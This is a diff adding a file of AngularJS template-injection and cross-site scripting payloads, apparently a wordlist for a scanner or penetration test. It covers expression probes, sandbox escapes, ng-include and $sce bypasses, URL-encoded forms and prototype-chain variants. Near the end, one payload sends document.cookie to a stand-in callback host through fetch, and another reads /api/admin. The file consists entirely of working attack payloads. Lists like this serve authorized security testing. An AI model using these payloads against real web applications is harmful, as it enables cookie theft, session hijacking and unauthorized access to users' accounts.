@@ -1,0 +1,49 @@
+# Angular XSS — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+# ── Advanced — sandbox escapes ─────────────────────────────────────────────
+<input ng-app ng-csp ng-focus="$event.composedPath()|orderBy:'[].constructor.from`${alert(1)}`'">
+{{a='constructor';b={}[a];b.prototype.nodeType='';d=b('alert(1)');d()}}
+{{$eval.constructor('alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
+<div ng-app ng-csp><a ng-click=$event.view.alert(1)>XSS</a></div>
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+<img src=x ng-app ng-csp ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">
+# ── Advanced — ng-include ─────────────────────────────────────────────────
+<div ng-app><div ng-include="'data:text/html,<script>alert(1)<\/script>'"></div></div>
+# ── Advanced — expression probes ──────────────────────────────────────────
+{{7*7}}
+{{1+1}}
+{{'a'+'b'}}
+{{undefined.a}}
+# ── Advanced — $root leak ──────────────────────────────────────────────────
+{{$root.$$phase}}
+{{$id()}}
+{{constructor}}
+# ── Advanced — bypass variants ─────────────────────────────────────────────
+{{''.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{a={}; a.b=a.constructor('alert(1)')(); a.b()}}
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+# ── URL-encoded Angular ────────────────────────────────────────────────────
+%7b%7bconstructor.constructor('alert(1)')()%7d%7d
+%7b%7b7*7%7d%7d
+# ── AngularJS prototype chain bypass ──────────────────────────────────────
+{{''.sub.constructor('alert(1)')()}}
+{{[].join.constructor('alert(1)')()}}
+{{''.indexOf.constructor('alert(1)')()}}
+{{Math.max.constructor('alert(1)')()}}
+{{Function.prototype.constructor.call(null,'alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+{{Object.keys.constructor('alert(1)')()}}
+# ng-bind-html with $sce bypass
+<div ng-app ng-bind-html="'<img src=x onerror=alert(1)>' | trustAs:'html'"></div>
+<div ng-bind-html="::x" ng-init="x='<img src=x onerror=alert(1)>'"></div>
+# AngularJS v1 universal bypass
+<script>angular.element(document).injector().get('$compile')('<img src=x onerror=alert(1)>')(angular.element(document.body).scope()).$watch(function(){alert(1)})</script>
+# ng-model leak
+{{$http.get('/api/admin').then(r=>alert(r.data))}}
+# AngularJS 1.6+ bypass
+{{constructor.constructor('fetch(`http://INTERACTSH_URL/?c=`+document.cookie)')()}}
+# Bypass via unicode
+{{constructor[constructor]('alert(1)')()}}
